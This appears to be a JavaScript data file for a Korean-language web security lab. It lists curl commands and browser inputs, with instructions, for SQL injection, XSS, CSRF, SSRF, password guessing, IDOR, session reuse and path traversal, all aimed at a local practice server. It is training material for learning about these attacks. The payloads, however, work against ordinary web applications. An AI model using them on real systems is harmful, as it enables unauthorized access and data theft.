window.legacyExamples=[
 [
  ["curl -i -X POST http://localhost:10002/login --data-urlencode \"user_id=admin' OR '1'='1' -- \" --data-urlencode 'password=wrong'",'Python 실습 서버의 로그인 요청입니다. 303 응답과 세션 쿠키를 확인하세요.'],
  ["curl -sS -G 'http://localhost:10002/board' --data-urlencode \"keyword=unlikely_match' UNION SELECT 99999,'lab','1234','lab@example.com','UNION_TEST','demo','F',0,'',0,NOW() -- \"",'통합 DB의 11개 컬럼에 맞춘 예제입니다. 응답에 UNION_TEST라는 합성 게시글 제목이 나타나는지 확인하세요. DB에 게시글을 저장하지는 않습니다.'],
  ["curl -sS -G 'http://localhost:10002/board' --data-urlencode \"keyword=' AND 1=1 -- \"\ncurl -sS -G 'http://localhost:10002/board' --data-urlencode \"keyword=' AND 1=2 -- \"",'첫 응답은 기존 게시글을, 두 번째 응답은 검색 결과 0개를 반환하는지 비교하세요.'],
  ["curl -sS -o /dev/null -w 'baseline: %{time_total}s\\n' -G 'http://localhost:10002/board' --data-urlencode \"keyword=' AND 1=1 -- \"\ncurl -sS -o /dev/null -w 'delayed: %{time_total}s\\n' -G 'http://localhost:10002/board' --data-urlencode \"keyword=' AND IF(id=(SELECT MIN(strNumber) FROM board),SLEEP(1),0)=0 -- \"",'두 응답 시간을 비교하세요. 최소 번호 게시글 한 건에 약 1초 지연을 주므로 게시글이 최소 한 건 필요합니다.'],
  ["curl -i -G 'http://localhost:10002/board' --data-urlencode \"keyword='\"",'예상 결과는 HTTP 500과 Internal Server Error입니다. 상세 SQL 오류는 서버 로그에서 확인합니다. 이 예제는 오류 유발을 관찰하며 오류 메시지를 이용한 데이터 추출까지 수행하지는 않습니다.']
 ],
 [
  ["curl -G 'http://localhost:10002/board' --data-urlencode 'keyword=<script>alert(1)<\/script>'",'응답 HTML을 확인하세요. 스크립트 실행은 브라우저에서 해당 검색어를 입력해 확인합니다.'],
  ["curl -i -X POST 'http://localhost:10002/board/write' --data-urlencode 'author=test' --data-urlencode 'password=1234' --data-urlencode 'subject=stored-xss-lab' --data-urlencode 'content=<script>alert(2)<\/script>' --data-urlencode 'allow_html=T'",'웹셸에서 테스트 글을 저장합니다. 303 응답의 location에 표시된 /board/번호를 브라우저의 localhost:10002 뒤에 붙여 열면 알림 2가 표시됩니다. 실습 후 글 비밀번호 1234로 삭제하세요.'],
  ["curl -sS 'http://localhost:10002/lab/dom'",'DOM 처리 코드를 조회합니다. 실제 실행 확인은 아래 주소창용 URL을 브라우저에서 여세요. curl은 JavaScript를 실행하지 않습니다.']
 ],
 [
  ["curl -c cookies.txt -X POST 'http://localhost:10002/login' --data 'user_id=test&password=test1234'\ncurl -b cookies.txt 'http://localhost:10002/profile/nickname?nickname=csrf_demo'",'Python 테스트 계정의 닉네임을 변경합니다. 두 번째 요청은 인증된 상태 변경을 직접 재현하며, 실제 CSRF는 제3자 페이지를 통한 요청 유도가 추가로 필요합니다.'],
  ["curl -i -X POST 'http://localhost:10002/login' -H 'Origin: http://localhost:8000' --data 'user_id=test&password=test1234'",'다른 출처의 로그인 요청을 서버가 받아들이는지 확인합니다. 실제 브라우저의 계정 변경은 아래 공격 페이지 URL을 열어 확인하세요.']
 ],
 [
  ["curl -G 'http://localhost:10002/oracle' --data-urlencode 'url=http://127.0.0.1:8000/health'",'Python 서버 내부의 주소로 요청을 보내고 응답에 포함된 결과를 확인합니다.'],
  ["curl -sS -G 'http://localhost:10002/lab/blind' --data-urlencode 'url=http://127.0.0.1:9001/observe?token=blind-demo'\ncurl -sS 'http://localhost:10002/lab/callbacks?token=blind-demo'",'첫 요청은 대상 응답 본문을 숨깁니다. 두 번째 요청의 기록에서 blind-demo token이 있는지 확인하세요. 기록은 최근 256건이며 서버 재시작 시 지워집니다.']
 ],
 [
  ["for password in wrong1 wrong2 test1234; do\n  printf '%s: ' \"$password\"\n  curl -s -o /dev/null -w '%{http_code}\\n' -X POST 'http://localhost:10002/login' --data-urlencode 'user_id=test' --data-urlencode \"password=$password\"\ndone",'Bash에서 Python 실습 서버의 test 계정에 세 가지 비밀번호를 순서대로 시도합니다. 실패 응답 200과 성공 응답 303을 비교하세요. 마지막 값은 기본 테스트 비밀번호입니다.'],
  ["printf '%s\\n' wrong1 wrong2 test1234 > lab-passwords.txt\nwhile IFS= read -r password; do\n  printf '%s: ' \"$password\"\n  curl -s -o /dev/null -w '%{http_code}\\n' -X POST 'http://localhost:10002/login' --data-urlencode 'user_id=test' --data-urlencode \"password=$password\"\ndone < lab-passwords.txt",'Bash에서 작은 사전 파일을 만든 뒤 Python 실습 서버의 test 계정에 각 후보를 시도합니다. 성공 시 303, 실패 시 200 응답을 확인하세요. 첫 줄은 현재 폴더의 lab-passwords.txt를 덮어씁니다.'],
  ["curl -sS 'http://localhost:10002/lab/rainbow?admin_id=1'",'별도 관리자 멤버 테이블 lab_admin_members에서 lab_admin 계정의 MD5 해시를 읽어 소규모 레인보우 테이블과 대조합니다. 원문 후보 cat07과 재검증 완료 메시지를 확인하세요.']
 ],
 [["curl -s -c lab-cookie.txt -X POST http://localhost:10002/login --data 'user_id=test&password=test1234'\ncurl -s -b lab-cookie.txt 'http://localhost:10002/lab/profile?user_id=admin'",'test 계정으로 로그인한 뒤 admin의 프로필이 반환되는지 확인하세요. 쿠키 파일이 현재 폴더에 생성됩니다.']],
 [["curl -s -c lab-cookie.txt -X POST http://localhost:10002/login --data 'user_id=test&password=test1234'\ncurl -i -b lab-cookie.txt http://localhost:10002/logout\ncurl -i -b lab-cookie.txt http://localhost:10002/profile",'로그아웃 응답을 받은 뒤에도 저장해 둔 이전 쿠키로 프로필에 접근할 수 있는지 확인합니다. 쿠키 파일은 로그인 상태를 담고 있습니다.']],
 [["printf 'upload test\\n' > lab-upload.txt\ncurl -i -X POST http://localhost:10002/board/write -F author=test -F password=1234 -F subject=upload-lab -F content=test -F 'attachment=@lab-upload.txt;filename=lab-upload.xyz'",'실습 게시글에 임의 확장자의 무해한 파일을 첨부합니다. 게시글과 공유 업로드 폴더에 파일이 남습니다. 서버 측 코드 실행을 뜻하지는 않습니다.']],
 [["curl -G http://localhost:10002/lab/file --data-urlencode 'name=../private/note.txt'",'공개 파일 디렉터리에서 상위 경로를 통해 별도의 가상 비공개 문서를 읽습니다. 실제 서버 파일은 접근할 수 없습니다.']]
];
window.legacyWebExamples=[
 [
  ['로그인 아이디',"admin' OR '1'='1' -- ",'Python 서버의 로그인 화면에서 아이디에 입력하고 비밀번호에는 임의의 값을 입력하세요. 마지막 공백도 포함합니다.'],
  ['게시판 검색어',"unlikely_match' UNION SELECT 99999,'lab','1234','lab@example.com','UNION_TEST','demo','F',0,'',0,NOW() -- ",'Python 게시판 검색창에 입력하고 합성 제목 UNION_TEST를 확인하세요.'],
  ['게시판 검색어',"' AND 1=1 -- \n' AND 1=2 -- ",'두 값을 각각 입력하고 기존 게시글과 검색 결과 0개의 차이를 비교하세요.'],
  ['게시판 검색어',"' AND IF(id=(SELECT MIN(strNumber) FROM board),SLEEP(1),0)=0 -- ",'Python 게시판 검색창에 입력하면 최소 번호 게시글 한 건에 약 1초 지연이 발생합니다.'],
  ['게시판 검색어',"'",'Python 게시판 검색창에 입력하고 응답이나 서버 로그의 오류를 살펴보세요.']
 ],
 [
  ['게시판 검색어','<script>alert(1)<\/script>','Python 게시판 검색창에 입력해 반사된 결과를 확인하세요.'],
  ['게시글 내용',"<script>alert(2)<\/script>",'Python 게시글 작성 화면의 내용에 입력하고 HTML 허용 상태로 저장한 뒤 게시글을 확인하세요.'],
  ['주소창','http://localhost:10002/lab/dom#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E','주소를 열면 # 뒤 입력값이 innerHTML로 처리되어 알림창 1이 표시됩니다.']
 ],
 [
  ['주소창','http://localhost:10002/profile/nickname?nickname=csrf_demo','Python 서버에서 test 계정으로 로그인한 후 주소창에 입력하면 닉네임이 변경됩니다. 실제 CSRF에는 제3자 페이지를 통한 요청 유도가 추가로 필요합니다.'],
  ['주소창','http://localhost:8000/lab/login-csrf.html?run=1','이 URL을 새 탭의 주소창에서 여세요. 별도 출처의 페이지가 test 계정으로 로그인 요청을 보내고 Python 사이트로 이동합니다. 기존 로그인 계정도 test로 바뀝니다.']
 ],
 [
  ['oracle URL 입력란','http://127.0.0.1:8000/health','Python 실습 서버의 /oracle 화면에서 URL 입력란에 넣고 요청 결과를 확인하세요. 주소는 서버 컨테이너 내부를 가리킵니다.'],
  ['주소창','http://localhost:10002/lab/blind?url=http%3A%2F%2F127.0.0.1%3A9001%2Fobserve%3Ftoken%3Dblind-demo&token=blind-demo','이 주소를 연 뒤 요청 기록 확인을 누르세요. 같은 token의 수신 기록이 나타나면 서버 요청이 확인된 것입니다.']
 ],
 [
  ['로그인 화면','아이디: test\n비밀번호: wrong1 → wrong2 → test1234','Python 로그인 화면에서 같은 아이디로 비밀번호를 하나씩 입력하세요. 앞의 두 번은 실패하고 기본 테스트 비밀번호에서는 로그인됩니다.'],
  ['로그인 화면','아이디: test\n비밀번호 후보: wrong1, wrong2, test1234','Python 로그인 화면에서 사전에 준비한 후보를 하나씩 입력해 결과를 비교하세요. 자동으로 시도하려면 맨 아래 CLI 예제를 사용하세요.'],
  ['주소창','http://localhost:10002/lab/rainbow?admin_id=1','관리자 멤버 테이블에 저장된 lab_admin의 MD5 해시와 원문 후보 cat07을 확인하세요. MariaDB 탭에서 SELECT * FROM lab_admin_members;로 저장된 테스트 계정을 조회할 수도 있습니다.']
 ],
 [['주소창','http://localhost:10002/lab/profile?user_id=admin','Python 서버에서 test 계정으로 로그인한 뒤 주소를 열어 다른 사용자의 프로필이 표시되는지 확인하세요.']],
 [['브라우저 개발자 도구','로그인 → session 쿠키 저장 → 로그아웃 → 이전 쿠키 복원 → /profile','테스트 계정으로 로그인하고 브라우저 개발자 도구에서 session 쿠키를 보관한 후 로그아웃합니다. 이전 쿠키를 복원하고 프로필을 열어 확인하세요.']],
 [['게시글 파일 첨부','lab-upload.xyz','Python 게시글 작성 화면에서 해당 확장자를 가진 무해한 파일을 첨부하고 게시글을 확인하세요. 파일은 세 사이트의 공유 업로드 폴더에 저장됩니다.']],
 [['주소창','http://localhost:10002/lab/file?name=../private/note.txt','주소를 열어 가상 비공개 문서가 표시되는지 확인하세요. 일반 문서는 /lab/file?name=welcome.txt입니다.']]
];
